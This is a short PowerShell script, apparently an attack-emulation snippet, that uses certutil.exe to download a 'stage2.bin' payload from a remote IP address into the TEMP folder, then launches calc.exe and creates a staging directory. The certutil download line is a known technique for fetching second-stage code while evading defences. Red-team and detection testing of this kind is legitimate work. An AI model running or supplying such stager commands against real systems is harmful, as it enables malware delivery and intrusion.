
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'https://192.0.2.114/cdn/stage2.bin'
)
certutil.exe -urlcache -split -f $EndpointUrl "$env:TEMP\stage2.bin"
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
